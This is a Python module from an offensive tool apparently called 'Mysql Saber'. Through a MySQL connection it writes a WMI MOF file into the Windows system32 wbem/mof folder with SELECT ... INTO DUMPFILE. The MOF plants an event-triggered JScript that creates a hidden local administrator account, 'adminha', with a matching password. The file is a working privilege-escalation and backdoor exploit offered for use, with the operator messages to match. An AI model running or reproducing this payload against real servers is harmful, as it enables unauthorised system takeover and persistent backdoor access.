#! /usr/bin/env python
#coding=utf-8
import sys
from MysqlSaber_col import printWait,printError,printResult

def Sknight():
    printWait('''
        #######################################################
        #                                                     #
        #           Mysql Saber ---- MOF Knight               #
        #               BY haxsscker#f4ck.net                 #
        #                                                     #
        #######################################################
    ''')

def Smof(sword):
    try:
        sword.execute('SELECT \'#pragma namespace("\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\subscription")\r\n\r\ninstance of __EventFilter as $EventFilter\r\n{\r\n    EventNamespace = "Root\\\\\\\\Cimv2";\r\n    Name  = "filtP2";\r\n    Query = "Select * From __InstanceModificationEvent "\r\n            "Where TargetInstance Isa \\\\"Win32_LocalTime\\\\" "\r\n            "And TargetInstance.Second = 5";\r\n    QueryLanguage = "WQL";\r\n};\r\n\r\ninstance of ActiveScriptEventConsumer as $Consumer\r\n{\r\n    Name = "consPCSV2";\r\n    ScriptingEngine = "JScript";\r\n    ScriptText = \r\n    "var WSH = new ActiveXObject(\\\\"WScript.Shell\\\\")\\\\nWSH.run(\\\\"net.exe adminha adminha /add&net.exe localgroup administrators adminha /add\\\\")";\r\n};\r\n\r\ninstance of __FilterToConsumerBinding\r\n{\r\n    Consumer   = $Consumer;\r\n    Filter = $EventFilter;\r\n};\' INTO DUMPFILE \'c:/windows/system32/wbem/mof/nullevt.mof\';')
    except Exception,e:
        printError(e)
        printError("[+Saber+]===> Hey boy, what's wrong?!Try again or go to levelUP...")
    else:
        printResult('''
            [+Saber+]===> Hey, you have done it! 
            [+Saber+]===> Oh, the user&pass are both \"adminha\" !!Good luck!!
            [+Saber+]===> Please waiting for several minutes, and then you may check it!!
        ''')

def main(sword):
    Smof(sword)
    printWait("[+Saber+]===> Quit mof and use other function? ")
    scontinue = 'y'
    scontinue = raw_input("continue?(y/n): y?")
    if scontinue == 'n':
        sword.close()
        sys.exit()
    
